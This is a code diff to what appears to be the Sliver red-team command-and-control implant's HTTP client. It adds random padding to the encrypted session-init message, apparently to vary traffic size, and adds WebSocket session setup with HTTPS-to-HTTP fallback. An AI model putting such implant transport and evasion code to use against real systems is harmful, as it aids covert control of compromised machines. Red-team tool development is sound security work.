@@ -56,9 +56,9 @@ const (
 )
 
 var (
-	ErrClosed               = errors.New("http session closed")
-	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
-	TimeDelta time.Duration = 0
+	ErrClosed                             = errors.New("http session closed")
+	ErrStatusCodeUnexpected               = errors.New("unexpected http response code")
+	TimeDelta               time.Duration = 0
 )
 
 // HTTPOptions - c2 specific configuration options
@@ -175,7 +175,8 @@ type SliverHTTPClient struct {
 func (s *SliverHTTPClient) SessionInit() error {
 	sKey := cryptography.RandomKey()
 	s.SessionCtx = cryptography.NewCipherContext(sKey)
-	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
+	r := insecureRand.New(insecureRand.NewSource(time.Now().UnixNano())).Intn(2000) + 1000
+	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:], Buffer: make([]byte, r)}
 	data, _ := proto.Marshal(httpSessionInit)
 
 	encryptedSessionInit, err := cryptography.ECCEncryptToServer(data)
@@ -353,12 +354,12 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 	if resp.StatusCode != http.StatusOK {
 		serverDateHeader := resp.Header.Get("Date")
 		if serverDateHeader != "" {
-				// If the request failed and there is a Date header, find the time difference and save it for the next request
-				curTime := time.Now().UTC()
-				serverTime, err := time.Parse(time.RFC1123, serverDateHeader)
-				if err == nil {
-					TimeDelta = serverTime.UTC().Sub(curTime)
-				}
+			// If the request failed and there is a Date header, find the time difference and save it for the next request
+			curTime := time.Now().UTC()
+			serverTime, err := time.Parse(time.RFC1123, serverDateHeader)
+			if err == nil {
+				TimeDelta = serverTime.UTC().Sub(curTime)
+			}
 		}
 		// {{if .Config.Debug}}
 		log.Printf("[http] non-200 response (%d): %v", resp.StatusCode, resp)
@@ -677,6 +678,54 @@ func httpsClient(address string, opts *HTTPOptions) *SliverHTTPClient {
 		Options:   opts,
 	}
 	return client
+}
+
+// WsSessionInit - Initialize the session
+func (s *SliverHTTPClient) WsSessionInit() error {
+	uri := s.pollURL()
+	req := s.newHTTPRequest(http.MethodGet, uri, nil)
+	// {{if .Config.Debug}}
+	log.Printf("[ws] Get -> %s ", uri)
+	// {{end}}
+
+	_, err := s.driver.Do(req)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] http response error: %s", err)
+		// {{end}}
+		return err
+	}
+	return nil
+}
+
+// WebSocketStartSession - Attempts to start a session with a given address
+func WebSocketStartSession(address string, pathPrefix string, opts *HTTPOptions) (*SliverHTTPClient, error) {
+	var client *SliverHTTPClient
+	var err error
+	if !opts.ForceHTTP {
+		client = httpsClient(address, opts)
+		client.Options = opts
+		client.PathPrefix = pathPrefix
+		err = client.WsSessionInit()
+		if err == nil {
+			return client, nil
+		}
+	}
+	if err != nil || opts.ForceHTTP {
+		// If we're using default ports then switch to 80
+		if strings.HasSuffix(address, ":443") {
+			address = fmt.Sprintf("%s:80", address[:len(address)-4])
+		}
+		opts.ForceHTTP = true
+		client = httpClient(address, opts)
+		client.Options = opts
+		client.PathPrefix = pathPrefix
+		err = client.WsSessionInit()
+		if err == nil {
+			return client, nil
+		}
+	}
+	return client, nil
 }
 
 // {{end}} -HTTPc2Enabled
